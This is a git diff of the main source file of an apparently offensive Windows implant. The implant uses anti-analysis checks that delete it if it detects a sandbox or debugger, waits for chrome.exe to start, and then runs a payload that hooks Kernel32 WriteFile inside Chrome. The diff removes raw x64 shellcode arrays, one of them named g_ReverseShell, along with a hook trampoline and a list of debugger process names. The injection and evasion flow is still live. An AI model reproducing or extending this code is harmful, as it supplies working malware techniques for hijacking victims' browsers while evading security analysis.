@@ -1,64 +1,28 @@
+
 #include "Windows.h"
-#include <tlhelp32.h>
 #include "API/headers/api.h"
 #include "utils/headers/antianalysis.h"
 #include "../headers/payload.h"
+#include "utils/headers/Tools.h"
 
-
-//#define TARGET_FUNC	"WriteFile"
-//#define TARGET_DLL	"Kernel32"
+#define WIN32_LEAN_AND_MEAN
 #define TARGET_FUNC	"WriteFile"
 #define TARGET_DLL	"Kernel32"
+
 
 // Get rid of weird crt call because of float
 #ifdef __cplusplus
 extern "C" {
 #endif
-	int _fltused = 0; // it should be a single underscore since the double one is the mangled name
+	int _fltused = 0;
 #ifdef __cplusplus
 }
 #endif
 
-
-DWORD GetPID(const char* process);
-
-// spawn calculator for now
-unsigned char g_ReverseShell[106] = {
-		0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
-		0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
-		0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
-		0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
-		0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
-		0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
-		0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
-		0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
-		0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
-};
-
-unsigned char g_HookShellCode[63] = {
-	0x5B, 0x48, 0x83, 0xEB, 0x04, 0x48, 0x83, 0xEB, 0x01, 0x53, 0x51,
-	0x52, 0x41, 0x51, 0x41, 0x50, 0x41, 0x53, 0x41, 0x52, 0x48, 0xB9,
-	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 0x0B,
-	0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xEC, 0x20, 0xE8, 0x11, 0x00,
-	0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5A, 0x41, 0x5B, 0x41,
-	0x58, 0x41, 0x59, 0x5A, 0x59, 0x5B, 0xFF, 0xE3
-};
-
-/*
-
-WCHAR* debuggers[] = {
-		L"x64dbg.exe",                 
-		L"ida.exe",                    
-		L"ida64.exe",                  
-		L"VsDebugConsole.exe",         
-		L"msvsmon.exe"                 
-};
-*/
-
-
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
 	AntiAnalysis hide;
+	Tools		 tools;
 
 	auto& resolver = API::APIResolver::GetInstance();
 
@@ -76,15 +40,15 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	do
 	{
 		hide.IsBeingWatched(resolver); // Nuke self if in sandbox or debugger
-		process = GetPID("chrome.exe"); // Check if chrome is running
+		process = tools.GetPID("chrome.exe"); // Check if chrome is running
 
 		if (process != 0)
 		{
-			//hide.DelayExecution(0.2, resolver);
+			hide.DelayExecution(0.05, resolver);
 			break;
 		}
 
-		//hide.DelayExecution(0.2, resolver); // This should be every couple of minutes
+		hide.DelayExecution(0.1, resolver); // This should be every couple of minutes
 	} while (process == 0);
 
 	Payload(process, api, TARGET_DLL, TARGET_FUNC);
@@ -94,24 +58,3 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 } 
 
 
-
-
-
-DWORD GetPID(const char* process) {
-	DWORD processId = 0;
-	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (snapshot != INVALID_HANDLE_VALUE) {
-		PROCESSENTRY32 processEntry;
-		processEntry.dwSize = sizeof(PROCESSENTRY32);
-		if (Process32First(snapshot, &processEntry)) {
-			do {
-				if (strcmp(process, processEntry.szExeFile) == 0) {
-					processId = processEntry.th32ProcessID;
-					break;
-				}
-			} while (Process32Next(snapshot, &processEntry));
-		}
-		CloseHandle(snapshot);
-	}
-	return processId;
-}
